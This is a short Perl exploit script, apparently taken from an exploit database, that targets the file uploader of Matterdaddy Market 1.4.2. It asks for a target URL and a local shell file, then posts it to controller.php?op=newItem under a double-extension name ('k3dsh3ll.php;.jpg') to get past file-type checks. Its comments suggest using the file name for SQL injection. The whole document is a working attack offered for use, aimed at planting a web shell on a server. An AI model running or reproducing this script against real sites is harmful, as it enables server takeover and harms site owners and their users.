#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;
print <<INTRO;
|====================================================|
|=   Matterdaddy Market 1.4.2 File Uploader Fuzzer   |
|=         >> Provided By KedAns-Dz <<               |
|=          e-mail : ked-h[at]hotmail.com            |
|====================================================|
INTRO
print "\n";
print "[!] Enter URL(f.e: http://target.com): ";
    chomp(my $url=<STDIN>);
print "\n";
print "[!] Enter File Path (f.e: C:\\Shell.php;.gif): "; # File Path For Upload (usage : C:\\Sh3ll.php;.gif)
    chomp(my $file=<STDIN>);
my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/controller.php?op=newItem',
        Content_Type => 'multipart/form-data',
        Content      =>
            [
        'md_title' => '1337day',
        'md_description' => 'Inj3ct0r Exploit Database',
        'md_price' => '0',
        'md_email2' => 'kedans@pene-test.dz', # put u'r email here !
        'city' => 'Hassi Messaoud',
        'namer' => 'KedAns-Dz',
        'category' => '4',
        'filetoupload' => $file,
    'filename' => 'k3dsh3ll.php;.jpg',
 # to make this exploit as sqli change file name to :
 # k3dsh3ll' [+ SQLi +].php.jpg
 # use temperdata better ;)
        ] );
print "\n";
if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "[+] Exploit Successfull! File Uploaded!\n"; }
    else { print "[!] Check your email and confirm u'r post! \n"; }
} else { print "[-] HTTP request Failed!\n"; }
exit;

